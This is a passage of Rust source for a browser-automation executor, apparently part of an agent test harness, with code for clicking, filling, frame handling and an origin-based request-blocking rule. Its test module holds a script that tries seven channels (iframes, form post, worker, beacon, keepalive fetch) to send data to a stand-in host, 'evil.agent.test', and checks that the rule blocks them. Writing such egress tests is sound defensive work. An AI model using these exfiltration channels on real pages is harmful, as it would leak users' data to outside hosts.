                        let child = self.child_frame_of(&place, &b).await?;
                        self.enter_frame(&child, &place, b);
                        let origin = self.frame_origin(&child).await?;
                        Box::pin(self.snapshot_frame(&child, Some(origin), lines)).await?;
                    } else {
                        push_children(&mut stack, true);
                    }
                }
            }
        }
        Ok(())
    }

    async fn frame_by_path(&self, path: &[&str]) -> Res<Result<FrameId, Resolved>> {
        let mut frame = self.main_frame().await?;
        for (i, name) in path.iter().enumerate() {
            let place = self.place_of(&frame);
            let owners: Vec<BackendNodeId> = self
                .ax_tree(&frame)
                .await?
                .iter()
                .filter(|n| !n.ignored)
                .filter(|n| map_role(&ax_text(&n.role)) == Some("frame"))
                .filter(|n| squeeze(&ax_text(&n.name)) == *name)
                .filter_map(|n| n.backend_dom_node_id)
                .collect();
            match owners.len() {
                0 => return Ok(Err(Resolved::None)),
                1 => {}
                _ => return Ok(Err(Resolved::Many { locator: i })),
            }
            frame = self.child_frame_of(&place, &owners[0]).await?;
            self.enter_frame(&frame, &place, owners[0]);
            if !self.ready(&frame).await {
                return Ok(Err(Resolved::None));
            }
        }
        Ok(Ok(frame))
    }

    async fn by_test_id(&self, frame: &FrameId, id: &str) -> Res<Vec<BackendNodeId>> {
        let place = self.place_of(frame);
        let ctx = self.world(frame).await?;
        let selector = format!("[data-testid=\"{}\"]", id.replace('"', "\\\""));
        let count_expr = format!(
            "document.querySelectorAll({}).length",
            serde_json::Value::String(selector.clone())
        );
        let count = self
            .eval_value(frame, &count_expr)
            .await?
            .as_u64()
            .unwrap_or(0);
        if count != 1 {
            return Ok(vec![BackendNodeId::new(0); count as usize]);
        }
        let params = EvaluateParams::builder()
            .expression(format!(
                "document.querySelector({})",
                serde_json::Value::String(selector)
            ))
            .context_id(ctx)
            .build()
            .map_err(|e| Fault::new("eval", e))?;
        let r = self.exec(&place, "eval", params).await?;
        let object = r
            .result
            .object_id
            .ok_or_else(|| Fault::new("eval", "no element"))?;
        let d = self
            .exec(
                &place,
                "node",
                DescribeNodeParams::builder().object_id(object).build(),
            )
            .await?;
        Ok(vec![d.node.backend_node_id])
    }

    async fn by_role(&self, frame: &FrameId, role: &str, name: &str) -> Res<Vec<BackendNodeId>> {
        Ok(self
            .ax_tree(frame)
            .await?
            .iter()
            .filter(|n| !n.ignored)
            .filter(|n| map_role(&ax_text(&n.role)) == Some(role))
            .filter(|n| squeeze(&ax_text(&n.name)) == name)
            .filter_map(|n| n.backend_dom_node_id)
            .collect())
    }

    pub async fn resolve(&mut self, locators: &[Locator], frame_path: &[&str]) -> Res<Resolved> {
        let frame = match self.frame_by_path(frame_path).await? {
            Ok(frame) => frame,
            Err(unresolved) => return Ok(unresolved),
        };
        let place = self.place_of(&frame);
        for (i, locator) in locators.iter().enumerate() {
            let found = match locator {
                Locator::TestId(id) => self.by_test_id(&frame, id).await?,
                Locator::Role(role, name) => self.by_role(&frame, role, name).await?,
            };
            match found.len() {
                0 => continue,
                1 => {
                    let reference = self.add_ref(Target {
                        frame: frame.clone(),
                        node: found[0],
                        place: place.clone(),
                    });
                    return Ok(Resolved::One {
                        reference,
                        locator: i,
                    });
                }
                _ => return Ok(Resolved::Many { locator: i }),
            }
        }
        Ok(Resolved::None)
    }

    pub async fn resolve_one(&mut self, locators: &[Locator], frame_path: &[&str]) -> Res<String> {
        match self.resolve(locators, frame_path).await? {
            Resolved::One { reference, .. } => Ok(reference),
            Resolved::None => Err(Fault::new("resolve", "none")),
            Resolved::Many { .. } => Err(Fault::new("resolve", "many")),
        }
    }

    fn target(&self, reference: &str) -> Res<Target> {
        reference
            .strip_prefix('e')
            .and_then(|n| n.parse::<usize>().ok())
            .and_then(|n| n.checked_sub(1))
            .and_then(|n| self.refs.get(n))
            .cloned()
            .ok_or_else(|| Fault::new("ref", reference.to_string()))
    }

    pub async fn frame_of(&self, reference: &str) -> Res<FrameId> {
        Ok(self.target(reference)?.frame)
    }

    async fn offset_of(&self, place: &Place) -> Res<(f64, f64)> {
        let mut x = 0.0;
        let mut y = 0.0;
        let mut here = place.clone();
        for _ in 0..MAX_FRAME_DEPTH {
            let Place::Frame(session) = &here else {
                return Ok((x, y));
            };
            let (parent, owner) = self
                .owners
                .lock()
                .ok()
                .and_then(|o| o.get(session).cloned())
                .ok_or_else(|| Fault::new("click", "frame owner"))?;
            let corner = self
                .call_on(&parent, &owner, CONTENT_CORNER_FN, Vec::new())
                .await?;
            let at = |i: usize| corner.get(i).and_then(|v| v.as_f64());
            let (Some(dx), Some(dy)) = (at(0), at(1)) else {
                return Err(Fault::new("click", "frame corner"));
            };
            x += dx;
            y += dy;
            here = parent;
        }
        Err(Fault::new("click", "frame depth"))
    }

    /// Clicks the ref with the mouse at the centre of its box. In a frame that runs in a process
    /// of its own, it first scrolls each frame that holds it into view, from the page down, and
    /// waits for two animation frames of the frame, and it then reads a mark that a click
    /// listener on the ref set: when the mark says that the click did not arrive, it clicks again,
    /// at most three times in all, and when the mark cannot be read because the document went
    /// away, the click counts as arrived.
    pub async fn click(&self, reference: &str) -> Res<()> {
        let t = self.target(reference)?;
        if t.place == Place::Page {
            return self.click_at(&t).await;
        }
        for _ in 0..FRAME_CLICK_TRIES {
            self.reveal(&t.place).await?;
            self.painted(&t.place).await?;
            self.call_on(&t.place, &t.node, MARK_CLICK_FN, Vec::new())
                .await?;
            self.click_at(&t).await?;
            match self
                .call_on(&t.place, &t.node, READ_CLICK_FN, Vec::new())
                .await
            {
                Ok(serde_json::Value::Bool(false)) => continue,
                _ => return Ok(()),
            }
        }
        Err(Fault::new("click", "not received"))
    }

    async fn reveal(&self, place: &Place) -> Res<()> {
        let mut chain: Vec<(Place, BackendNodeId)> = Vec::new();
        let mut here = place.clone();
        for _ in 0..MAX_FRAME_DEPTH {
            let Place::Frame(session) = &here else {
                break;
            };
            let (parent, owner) = self
                .owners
                .lock()
                .ok()
                .and_then(|o| o.get(session).cloned())
                .ok_or_else(|| Fault::new("click", "frame owner"))?;
            chain.push((parent.clone(), owner));
            here = parent;
        }
        for (parent, owner) in chain.iter().rev() {
            self.exec(
                parent,
                "click",
                ScrollIntoViewIfNeededParams::builder()
                    .backend_node_id(*owner)
                    .build(),
            )
            .await?;
        }
        Ok(())
    }

    async fn painted(&self, place: &Place) -> Res<()> {
        let params = EvaluateParams::builder()
            .expression(PAINTED_JS)
            .await_promise(true)
            .return_by_value(true)
            .build()
            .map_err(|e| Fault::new("click", e))?;
        self.exec(place, "click", params).await?;
        Ok(())
    }

    async fn click_at(&self, t: &Target) -> Res<()> {
        self.exec(
            &t.place,
            "click",
            ScrollIntoViewIfNeededParams::builder()
                .backend_node_id(t.node)
                .build(),
        )
        .await?;
        let quads = self
            .exec(
                &t.place,
                "click",
                GetContentQuadsParams::builder()
                    .backend_node_id(t.node)
                    .build(),
            )
            .await?;
        let q = quads
            .quads
            .first()
            .map(|q| q.inner().clone())
            .filter(|q| q.len() == 8)
            .ok_or_else(|| Fault::new("click", "no box"))?;
        let (dx, dy) = self.offset_of(&t.place).await?;
        let x = (q[0] + q[2] + q[4] + q[6]) / 4.0 + dx;
        let y = (q[1] + q[3] + q[5] + q[7]) / 4.0 + dy;
        for kind in [
            DispatchMouseEventType::MouseMoved,
            DispatchMouseEventType::MousePressed,
            DispatchMouseEventType::MouseReleased,
        ] {
            let mut b = DispatchMouseEventParams::builder()
                .r#type(kind.clone())
                .x(x)
                .y(y);
            if kind != DispatchMouseEventType::MouseMoved {
                b = b.button(MouseButton::Left).click_count(1);
            }
            let params = b.build().map_err(|e| Fault::new("click", e))?;
            self.exec(&Place::Page, "click", params).await?;
        }
        Ok(())
    }

    async fn focus(&self, t: &Target) -> Res<()> {
        self.exec(
            &t.place,
            "focus",
            FocusParams::builder().backend_node_id(t.node).build(),
        )
        .await?;
        Ok(())
    }

    pub async fn fill(&self, reference: &str, text: &str) -> Res<()> {
        let t = self.target(reference)?;
        self.focus(&t).await?;
        self.call_on(
            &t.place,
            &t.node,
            "function () { if (this.select) this.select(); }",
            Vec::new(),
        )
        .await?;
        self.exec(&t.place, "fill", InsertTextParams::new(text))
            .await?;
        Ok(())
    }

    pub async fn select(&self, reference: &str, label: &str) -> Res<()> {
        let t = self.target(reference)?;
        let v = self
            .call_on(
                &t.place,
                &t.node,
                SELECT_FN,
                vec![serde_json::Value::String(label.into())],
            )
            .await?;
        if v != serde_json::Value::Bool(true) {
            return Err(Fault::new("select", "no such option"));
        }
        Ok(())
    }

    pub async fn press(&self, reference: &str, key: &str) -> Res<()> {
        let t = self.target(reference)?;
        self.focus(&t).await?;
        let (code, text) = match key {
            "Enter" => (13, "\r"),
            "Tab" => (9, ""),
            "Escape" => (27, ""),
            _ => return Err(Fault::new("press", "key")),
        };
        for kind in [DispatchKeyEventType::KeyDown, DispatchKeyEventType::KeyUp] {
            let mut b = DispatchKeyEventParams::builder()
                .r#type(kind.clone())
                .key(key)
                .code(key)
                .windows_virtual_key_code(code);
            if kind == DispatchKeyEventType::KeyDown && !text.is_empty() {
                b = b.text(text);
            }
            let params = b.build().map_err(|e| Fault::new("press", e))?;
            self.exec(&t.place, "press", params).await?;
        }
        Ok(())
    }

    pub async fn upload(&self, reference: &str, file: &Path) -> Res<()> {
        let t = self.target(reference)?;
        self.exec(
            &t.place,
            "upload",
            SetFileInputFilesParams::builder()
                .file(file.display().to_string())
                .backend_node_id(t.node)
                .build()
                .map_err(|e| Fault::new("upload", e))?,
        )
        .await?;
        Ok(())
    }

    pub async fn read(&self, reference: &str) -> Res<String> {
        let t = self.target(reference)?;
        let v = self.call_on(&t.place, &t.node, READ_FN, Vec::new()).await?;
        v.as_str()
            .map(squeeze)
            .ok_or_else(|| Fault::new("read", "not text"))
    }

    pub async fn file_sizes(&self, reference: &str) -> Res<Vec<u64>> {
        let t = self.target(reference)?;
        let v = self
            .call_on(
                &t.place,
                &t.node,
                "function () { return Array.from(this.files || []).map((f) => f.size); }",
                Vec::new(),
            )
            .await?;
        Ok(v.as_array()
            .map(|a| a.iter().filter_map(|n| n.as_u64()).collect())
            .unwrap_or_default())
    }

    /// Arms the request rule: from now on every request of the browser, of every target that it
    /// has and of every target that it opens later, before that target runs, is paused before it
    /// leaves and let through only when its origin is one of `allowed_origins` and, for a
    /// state-changing request, when `state_changing` is true; it is failed otherwise. `paused`
    /// returns each paused request with its outcome. Arming again replaces the rule and drops the
    /// paused requests of the earlier one.
    pub async fn arm_rule(
        &mut self,
        allowed_origins: Vec<String>,
        state_changing: bool,
    ) -> Res<()> {
        self.wire
            .arm_rule(wire::Rule {
                allowed: allowed_origins,
                state_changing,
                hold: false,
                policy: None,
            })
            .await
    }

    /// Arms the rule as `arm_rule` does, and with it a policy that the executor adds to the
    /// response of every document and every script of every target, as a header line of its own:
    /// a document is answered by fulfilment with its own status, headers and body and the line,
    /// and a script, a worker's script among them, goes on with the line added. The site's own
    /// policy stays. `policy_counts` tells how often each was done.
    pub async fn arm_rule_with_policy(
        &mut self,
        allowed_origins: Vec<String>,
        state_changing: bool,
        policy: &str,
    ) -> Res<()> {
        self.wire
            .arm_rule(wire::Rule {
                allowed: allowed_origins,
                state_changing,
                hold: false,
                policy: Some(policy.to_string()),
            })
            .await
    }

    /// How often the policy was added: by fulfilment (`fulfilled`), on a response that went on
    /// (`continued`), and the failures of each.
    pub fn policy_counts(&self) -> std::collections::BTreeMap<String, u64> {
        self.wire.policy_counts()
    }

    /// For the row `same_site_rule` of U0.7c alone, and no operation of A11.1: arms the rule as
    /// `arm_rule` does on the executor's own page target and on nothing else, neither at the
    /// browser's level nor on a target that the page opens or holds apart.
    pub async fn arm_rule_on_page_only(
        &mut self,
        allowed_origins: Vec<String>,
        state_changing: bool,
    ) -> Res<()> {
        let home = self.home.clone();
        self.wire
            .arm_one(
                &home,
                wire::Rule {
                    allowed: allowed_origins,
                    state_changing,
                    hold: false,
                    policy: None,
                },
            )
            .await
    }

    /// Runs a script of the trial in an isolated world of the first frame of the page whose
    /// address starts with `prefix`, and returns its value; no operation of A11.1.
    pub async fn run_frame_script(&self, prefix: &str, source: &str) -> Res<serde_json::Value> {
        fn find(t: &FrameTree, prefix: &str) -> Option<FrameId> {
            for c in t.child_frames.iter().flatten() {
                if c.frame.url.starts_with(prefix) {
                    return Some(c.frame.id.clone());
                }
                if let Some(f) = find(c, prefix) {
                    return Some(f);
                }
            }
            None
        }
        let tree = self.frame_tree().await?;
        let frame = find(&tree, prefix).ok_or_else(|| Fault::new("frame", "no frame"))?;
        self.eval_value(&frame, source).await
    }

    /// For the trial of a driver that dies while a request is paused (U0.7, CP-22), and no
    /// operation of A11.1: arms a rule that lets through the reads of `allowed_origins` and leaves
    /// every other request paused with no answer, recorded with the outcome `Held`.
    pub async fn hold_requests(&mut self, allowed_origins: Vec<String>) -> Res<()> {
        self.wire
            .arm_rule(wire::Rule {
                allowed: allowed_origins,
                state_changing: false,
                hold: true,
                policy: None,
            })
            .await
    }

    /// Calls `hook` with the host and port of every document request of the executor's own page
    /// that the rule lets through, before the request goes on: the runner adds each hop of the
    /// first navigation to the relay's list this way (A11.1). `None` takes the hook away.
    pub fn on_main_document(&self, hook: Option<wire::Hook>) {
        self.wire.set_main_document_hook(hook);
    }

    /// The security origin of the frame that holds the frame `frame`, as the page's frame tree
    /// gives it; `None` when the frame is not in the tree of the executor's page or has no parent.
    pub async fn parent_origin_of(&self, frame: &str) -> Res<Option<String>> {
        fn walk(t: &FrameTree, frame: &str) -> Option<String> {
            for c in t.child_frames.iter().flatten() {
                if c.frame.id.inner() == frame {
                    return Some(t.frame.security_origin.clone());
                }
                if let Some(o) = walk(c, frame) {
                    return Some(o);
                }
            }
            None
        }
        Ok(walk(&self.frame_tree().await?, frame))
    }

    /// Runs a script of the trial in the page's own world of the main frame, through the debugging
    /// protocol, and returns its value. It is no operation of A11.1: the rows of A13.7 change the
    /// page with it.
    pub async fn run_page_script(&self, source: &str) -> Res<serde_json::Value> {
        let params = EvaluateParams::builder()
            .expression(source)
            .return_by_value(true)
            .build()
            .map_err(|e| Fault::new("script", e))?;
        let r = self.exec(&Place::Page, "script", params).await?;
        if r.exception_details.is_some() {
            return Err(Fault::new("script", "exception"));
        }
        Ok(r.result.value.unwrap_or(serde_json::Value::Null))
    }

    /// The frames that the browser runs as targets of their own, out of the process of the page
    /// that holds them: the id and the address of each target of type `iframe`.
    pub async fn frame_targets(&self) -> Res<Vec<(String, String)>> {
        let r = self
            .wire
            .call(None, GetTargetsParams::default())
            .await
            .map_err(|f| Fault::new("targets", f.1))?;
        Ok(r.target_infos
            .into_iter()
            .filter(|t| t.r#type == "iframe")
            .map(|t| (t.target_id.inner().clone(), t.url))
            .collect())
    }

    pub fn paused(&self) -> Vec<PausedRequest> {
        self.wire.paused()
    }

    pub async fn add_recorder(&mut self) -> Res<()> {
        self.exec(
            &Place::Page,
            "record",
            AddBindingParams::new(RECORD_BINDING),
        )
        .await?;
        self.exec(
            &Place::Page,
            "record",
            AddScriptToEvaluateOnNewDocumentParams::new(RECORDER_JS),
        )
        .await?;
        Ok(())
    }

    pub fn recorded(&self) -> Vec<String> {
        self.wire.binding_calls(RECORD_BINDING)
    }
}

pub fn split_url(url: &str) -> (String, String) {
    let Some((scheme, rest)) = url.split_once("://") else {
        return (String::new(), url.to_string());
    };
    let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
    let origin = format!("{scheme}://{}", &rest[..end]);
    let tail = &rest[end..];
    let path_end = tail.find(['?', '#']).unwrap_or(tail.len());
    let path = if tail[..path_end].is_empty() {
        "/".to_string()
    } else {
        tail[..path_end].to_string()
    };
    (origin, path)
}

fn ax_text(v: &Option<chromiumoxide::cdp::browser_protocol::accessibility::AxValue>) -> String {
    match v.as_ref().and_then(|v| v.value.as_ref()) {
        Some(serde_json::Value::String(s)) => s.clone(),
        Some(serde_json::Value::Null) | None => String::new(),
        Some(other) => other.to_string(),
    }
}

pub fn squeeze(s: &str) -> String {
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

pub fn map_role(raw: &str) -> Option<&'static str> {
    Some(match raw {
        "button" => "button",
        "link" => "link",
        "textbox" | "searchbox" => "textbox",
        "checkbox" => "checkbox",
        "radio" => "radio",
        "combobox" => "combobox",
        "option" | "MenuListOption" => "option",
        "heading" => "heading",
        "cell" | "gridcell" => "cell",
        "listitem" => "listitem",
        "StaticText" => "text",
        "Iframe" | "IframePresentational" => "frame",
        _ => return None,
    })
}

const CONTROL_ROLES: [&str; 7] = [
    "button", "link", "textbox", "checkbox", "radio", "combobox", "option",
];
const VALUE_ROLES: [&str; 2] = ["textbox", "combobox"];
const MAX_FRAME_DEPTH: usize = 8;
const FRAME_CLICK_TRIES: usize = 3;

const PAINTED_JS: &str = "new Promise((done) => {
  setTimeout(() => done(false), 1000);
  requestAnimationFrame(() => requestAnimationFrame(() => done(true)));
})";

const MARK_CLICK_FN: &str = "function () {
  this.__halvoClickArrived = false;
  this.addEventListener('click', () => { this.__halvoClickArrived = true; }, { capture: true, once: true });
  return true;
}";

const READ_CLICK_FN: &str = "function () { return this.__halvoClickArrived === true; }";

const CONTENT_CORNER_FN: &str = "function () {
  const r = this.getBoundingClientRect();
  const s = getComputedStyle(this);
  return [r.left + this.clientLeft + parseFloat(s.paddingLeft), r.top + this.clientTop + parseFloat(s.paddingTop)];
}";

const CREDENTIAL_FN: &str = "function () {
  const type = (this.getAttribute('type') || '').toLowerCase();
  const auto = (this.getAttribute('autocomplete') || '').toLowerCase().split(/\\s+/);
  const secret = ['current-password', 'new-password', 'one-time-code'].some((t) => auto.includes(t));
  const input = this.tagName === 'INPUT' && (type === 'password' || secret);
  const captcha = this.parentElement !== null && this.parentElement.closest('[data-halvo-captcha]') !== null;
  return input || captcha;
}";

const SELECT_FN: &str = "function (label) {
  const option = Array.from(this.options || []).find((o) => o.text.trim() === label);
  if (!option) return false;
  this.value = option.value;
  this.dispatchEvent(new Event('input', { bubbles: true }));
  this.dispatchEvent(new Event('change', { bubbles: true }));
  return true;
}";

const READ_FN: &str = "function () {
  if (this.tagName === 'INPUT' || this.tagName === 'SELECT' || this.tagName === 'TEXTAREA') return String(this.value);
  return String(this.innerText || this.textContent || '');
}";

pub const RECORD_BINDING: &str = "halvoRecord";

const RECORDER_JS: &str = "(() => {
  const send = globalThis.halvoRecord;
  if (typeof send !== 'function') return;
  const describe = (el) => {
    const tag = (el.tagName || '').toLowerCase();
    const type = (el.getAttribute && el.getAttribute('type') || '').toLowerCase();
    const role = el.getAttribute && el.getAttribute('role') || (tag === 'a' ? 'link' : tag === 'button' ? 'button'
      : tag === 'select' ? 'combobox' : tag === 'input' && type === 'checkbox' ? 'checkbox'
      : tag === 'input' || tag === 'textarea' ? 'textbox' : tag);
    const label = el.labels && el.labels[0] ? el.labels[0].textContent : '';
    const name = (el.getAttribute && el.getAttribute('aria-label') || label || el.textContent || '').trim().replace(/\\s+/g, ' ');
    return { role, name, testid: el.getAttribute && el.getAttribute('data-testid') || '' };
  };
  const report = (kind) => (e) => {
    const el = e.target && e.target.closest ? e.target.closest('a,button,input,select,textarea,[role]') || e.target : e.target;
    if (!el) return;
    send(JSON.stringify(Object.assign({ kind }, describe(el))));
  };
  document.addEventListener('click', report('click'), true);
  document.addEventListener('input', report('input'), true);
})();";

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn start_refuses_a_used_profile_directory() {
        let profile =
            std::env::temp_dir().join(format!("r3-web-used-profile-{}", std::process::id()));
        std::fs::create_dir_all(&profile).unwrap();
        std::fs::write(profile.join("Local State"), b"{}").unwrap();
        let opts = StartOptions {
            browser: PathBuf::from("/nonexistent/chrome"),
            profile,
            headless: true,
            flags: Vec::new(),
            channel: Channel::Pipe,
            relay: None,
            local_state: None,
            program: None,
        };
        let refused = Executor::start(&opts).await.err();
        assert_eq!(
            refused.map(|f| f.1),
            Some("profile path exists".to_string())
        );
    }

    /// The processes that name `profile` in their arguments and started at or after `since_us`.
    #[cfg(target_os = "macos")]
    fn naming(profile: &Path, since_us: u64) -> Vec<crate::procs::Proc> {
        let flag = format!("--user-data-dir={}", profile.display());
        crate::procs::table()
            .unwrap()
            .into_iter()
            .filter(|p| p.started_us >= since_us && p.pid != std::process::id())
            .filter(|p| crate::checks::command_args(p.pid).is_some_and(|a| a.contains(&flag)))
            .collect()
    }

    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn a_failed_start_ends_a_process_that_the_browser_left_with_its_profile() {
        let dir = std::env::temp_dir().join(format!("r3-web-leftover-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let stand_in = crate::standin::bundle(&dir);
        let browser = crate::standin::launcher(stand_in.binary.parent().unwrap(), "leave");
        let profile = dir.join("p");
        let opts = StartOptions {
            browser,
            profile: profile.clone(),
            headless: true,
            flags: Vec::new(),
            channel: Channel::Pipe,
            relay: None,
            local_state: None,
            program: Some(stand_in.binary.clone()),
        };
        let since_us = crate::procs::table()
            .unwrap()
            .into_iter()
            .find(|p| p.pid == std::process::id())
            .map(|p| p.started_us)
            .unwrap();
        let fault = Executor::start(&opts).await.err().map(|f| f.0);
        let left = naming(&profile, since_us);
        for p in &left {
            crate::procs::kill(p);
        }
        assert!(
            matches!(fault, Some("browser_start" | "no_channel")),
            "{fault:?}"
        );
        assert_eq!(left.len(), 0, "processes left that name the profile");
    }

    /// This process's creation time, the floor of what the tests below count as a run's own.
    #[cfg(target_os = "macos")]
    fn own_start_us() -> u64 {
        crate::procs::table()
            .unwrap()
            .into_iter()
            .find(|p| p.pid == std::process::id())
            .map(|p| p.started_us)
            .unwrap()
    }

    /// The processes that name `profile` (`naming`), read until `wait` has passed or one shows.
    #[cfg(target_os = "macos")]
    async fn named_within(
        profile: &Path,
        since_us: u64,
        wait: Duration,
    ) -> Vec<crate::procs::Proc> {
        let until = Instant::now() + wait;
        loop {
            let left = naming(profile, since_us);
            if !left.is_empty() || Instant::now() > until {
                return left;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
    }

    /// CP-126 E1 (1): a stand-in browser that answers the start and the stop on its pipe starts, when
    /// it is asked to close, a process that names the profile and starts another one 300 ms later,
    /// after the browser has ended. After the stop none of them is left.
    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn a_normal_stop_ends_a_process_that_appears_after_the_browser_ended() {
        let dir = std::env::temp_dir().join(format!("r3-web-late-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let stand_in = crate::standin::bundle(&dir);
        let profile = dir.join("p");
        let opts = StartOptions {
            browser: stand_in.script.clone(),
            profile: profile.clone(),
            headless: true,
            flags: Vec::new(),
            channel: Channel::Pipe,
            relay: None,
            local_state: None,
            program: Some(stand_in.binary.clone()),
        };
        let since_us = own_start_us();
        let ex = Executor::start(&opts).await.expect("the stand-in starts");
        ex.stop_and_remove().await;
        let left = named_within(&profile, since_us, Duration::from_secs(2)).await;
        for p in &left {
            crate::procs::kill(p);
        }
        assert_eq!(
            left.len(),
            0,
            "processes left after the stop that name the profile"
        );
    }

    /// CP-126 E1 (2): a failed start under a stand-in of the egress wrap. The wrap starts a shell
    /// (the check's, which carries the browser's arguments), the shell starts a stand-in of its
    /// `log stream` and the stand-in browser, and the wrap closes the pipe and ends. The failed start
    /// leaves no browser process and leaves the check's shell and its log stream running.
    #[cfg(target_os = "macos")]
    #[tokio::test]
    async fn a_failed_start_under_the_wrap_leaves_no_browser_and_leaves_the_check() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("r3-web-wrap-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let stand_in = crate::standin::bundle(&dir);
        let check = dir.join("check.sh");
        std::fs::write(
            &check,
            format!(
                "#!/bin/sh\nd=$(dirname \"$0\")\n/bin/sleep 30 &\necho $! >\"$d/log.pid\"\n{}=helper \"{}\" {} --exact --quiet --test-threads=1 -- \"$@\" &\necho $! >\"$d/browser.pid\"\n/bin/sleep 30\n",
                crate::standin::VAR,
                stand_in.binary.display(),
                crate::standin::ENTRY
            ),
        )
        .unwrap();
        let wrap = dir.join("wrap.sh");
        std::fs::write(
            &wrap,
            "#!/bin/sh\nd=$(dirname \"$0\")\n( exec 3<&- 4>&-; exec /bin/sh \"$d/check.sh\" \"$@\" ) &\necho $! >\"$d/check.pid\"\nn=0\nwhile [ ! -s \"$d/browser.pid\" ] && [ $n -lt 100 ]; do sleep 0.05; n=$((n + 1)); done\nsleep 0.3\nexit 0\n",
        )
        .unwrap();
        for f in [&check, &wrap] {
            std::fs::set_permissions(f, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let profile = dir.join("p");
        let opts = StartOptions {
            browser: wrap,
            profile: profile.clone(),
            headless: true,
            flags: Vec::new(),
            channel: Channel::Pipe,
            relay: None,
            local_state: None,
            program: Some(stand_in.binary.clone()),
        };
        let fault = Executor::start(&opts).await.err().map(|f| f.0);
        let pid = |name: &str| -> u32 {
            std::fs::read_to_string(dir.join(name))
                .unwrap_or_default()
                .trim()
                .parse()
                .unwrap_or(0)
        };
        let table = crate::procs::table().unwrap();
        let row = |p: u32| table.iter().find(|r| r.pid == p && p != 0).cloned();
        let (browser, shell, log) = (
            row(pid("browser.pid")),
            row(pid("check.pid")),
            row(pid("log.pid")),
        );
        for p in [&browser, &shell, &log].into_iter().flatten() {
            crate::procs::kill(p);
        }
        assert!(
            matches!(fault, Some("browser_start" | "no_channel")),
            "{fault:?}"
        );
        assert!(browser.is_none(), "the browser stand-in is left");
        assert!(shell.is_some(), "the check's shell was ended");
        assert!(log.is_some(), "the check's log stream was ended");
    }

    #[test]
    fn split_url_gives_origin_and_path() {
        assert_eq!(
            split_url("http://utility.agent.test:18090/prefs?x=1"),
            (
                "http://utility.agent.test:18090".to_string(),
                "/prefs".to_string()
            )
        );
        assert_eq!(
            split_url("http://pay.agent.test:18090"),
            ("http://pay.agent.test:18090".to_string(), "/".to_string())
        );
    }

    #[test]
    fn a_snapshot_line_quotes_and_marks() {
        let line = SnapshotLine {
            reference: "e7".into(),
            role: "textbox",
            name: "Say \"hi\"".into(),
            value: None,
            credential: true,
            frame: Some("http://pay.agent.test:18090".into()),
        };
        assert_eq!(
            line.render(),
            "e7 textbox \"Say ''hi''\" credential frame=http://pay.agent.test:18090"
        );
    }

    const WAYS_OUT: &str = r#"(() => {
  const E = 'http://evil.agent.test:PORT';
  const F = (p) => "fetch('" + E + p + "', {method: 'POST', body: 'x', mode: 'no-cors'})";
  const frame = (a) => { const i = document.createElement('iframe'); for (const k in a) i.setAttribute(k, a[k]); document.body.appendChild(i); };
  frame({sandbox: 'allow-scripts', srcdoc: '<script>' + F('/sbfetch') + '<\/script>'});
  frame({srcdoc: '<script>' + F('/plainfetch') + '<\/script>'});
  frame({sandbox: 'allow-scripts allow-forms', srcdoc: '<form method=post action="' + E + '/sbform"></form><script>document.forms[0].submit()<\/script>'});
  frame({src: 'data:text/html,<script>' + encodeURIComponent(F('/datafetch')) + '<\/script>'});
  new Worker(URL.createObjectURL(new Blob([F('/worker')])));
  navigator.sendBeacon(E + '/beacon', 'x');
  fetch(E + '/keepalive', {method: 'POST', body: 'x', mode: 'no-cors', keepalive: true}).catch(() => {});
  return true;
})()"#;

    #[tokio::test]
    #[ignore = "starts the browser that R3_TEST_BROWSER names and the fixture server; run with --ignored"]
    async fn the_armed_rule_fails_every_post_to_a_host_that_is_not_allowed() {
        let browser = std::env::var("R3_TEST_BROWSER")
            .expect("R3_TEST_BROWSER names the browser binary for the ignored tests");
        let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../..");
        let server = crate::fixture::Server::start(
            &crate::fixture::fixture_program(&repo),
            &["--port".into(), "0".into()],
        )
        .expect("fixture");
        let port = server.port;
        let control = crate::fixture::Control { port };
        control.reset(&[]).expect("reset");
        let base = Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("target")
            .join("test-tmp");
        std::fs::create_dir_all(&base).expect("test-tmp");
        let mut flags: Vec<String> = crate::FIRST_FLAGS.iter().map(|f| f.to_string()).collect();
        flags.push(crate::RESOLVER_RULE.to_string());
        flags.push(crate::isolate_flag(port));
        let opts = StartOptions {
            browser: PathBuf::from(browser),
            profile: base.join(format!("rule-{}-{port}", std::process::id())),
            headless: true,
            flags,
            channel: Channel::Pipe,
            relay: None,
            local_state: None,
            program: None,
        };
        let mut ex = Executor::start(&opts).await.expect("start");
        let utility = crate::fixture::origin(crate::fixture::UTILITY, port);
        let steps = async {
            ex.open(&format!("{utility}/signin")).await?;
            ex.arm_rule(vec![utility.clone()], false).await?;
            ex.run_page_script(&WAYS_OUT.replace("PORT", &port.to_string()))
                .await?;
            tokio::time::sleep(Duration::from_secs(4)).await;
            Ok::<(Vec<PausedRequest>, Vec<String>), Fault>((ex.paused(), ex.attach_faults()))
        }
        .await;
        let state = control.state();
        ex.stop_and_remove().await;
        server.stop();
        let (paused, faults) = steps.expect("steps");
        let evil = crate::fixture::count(&state.expect("state"), &["requests", "evil"]);
        let failed: Vec<String> = paused
            .iter()
            .filter(|p| host_of(&p.origin) == "evil.agent.test" && p.outcome == Outcome::Failed)
            .map(|p| p.path.clone())
            .collect();
        assert_eq!(
            evil,
            Some(0),
            "requests.evil moved; failed: {failed:?}; faults: {faults:?}"
        );
        for path in [
            "/sbfetch",
            "/plainfetch",
            "/sbform",
            "/datafetch",
            "/worker",
            "/beacon",
            "/keepalive",
        ] {
            assert!(
                failed.iter().any(|f| f == path),
                "{path} was not failed: {failed:?}; faults: {faults:?}"
            );
        }
    }
}
